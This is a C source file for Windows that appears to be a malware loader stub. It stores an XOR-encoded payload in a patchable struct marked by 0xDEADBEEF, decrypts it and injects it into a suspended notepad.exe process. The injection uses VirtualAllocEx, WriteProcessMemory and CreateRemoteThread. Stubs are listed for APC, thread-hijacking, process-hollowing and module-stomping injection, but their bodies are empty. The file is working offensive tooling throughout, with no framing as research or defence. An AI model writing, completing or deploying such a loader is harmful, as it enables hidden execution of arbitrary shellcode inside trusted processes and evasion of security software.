#include <windows.h>

#define PAYLOAD_MARKER 0xDEADBEEF
#define MAX_PAYLOAD_SIZE 8192
#define MAX_PROCESS_NAME 256

#pragma pack(push, 1)
typedef struct {
	DWORD payload_size;
	unsigned char payload[MAX_PAYLOAD_SIZE];
	unsigned char xor_key;
	unsigned char technique;
	char target_process[MAX_PROCESS_NAME];
} PatchData;
#pragma pack(pop)

PatchData patch_data = {
	PAYLOAD_MARKER,
	{0},
	0,
	0,
	"notepad.exe"
};

void decrypt_payload() {
	DWORD i;
	if (patch_data.xor_key != 0) {
		for (i = 0; i < patch_data.payload_size; i++) {
			patch_data.payload[i] ^= patch_data.xor_key;
		}
	}
}

void inject_create_remote_thread() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf;
	HANDLE hThread;
	DWORD old;

	if (!CreateProcessA(NULL, patch_data.target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	buf = VirtualAllocEx(pi.hProcess, NULL, patch_data.payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buf) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!WriteProcessMemory(pi.hProcess, buf, patch_data.payload, patch_data.payload_size, NULL)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!VirtualProtectEx(pi.hProcess, buf, patch_data.payload_size, PAGE_EXECUTE_READ, &old)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
	if (hThread) {
		CloseHandle(hThread);
	}

	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void inject_apc() {

}

void inject_thread_hijacking() {

}

void inject_process_hollowing() {

}

void inject_module_stomping() {

}

typedef void (*InjectionFunc)();

InjectionFunc injection_techniques[] = {
	inject_create_remote_thread,
	inject_apc,
	inject_thread_hijacking,
	inject_process_hollowing,
	inject_module_stomping
};

int main() {
	decrypt_payload();
	injection_techniques[patch_data.technique]();
	return 0;
}
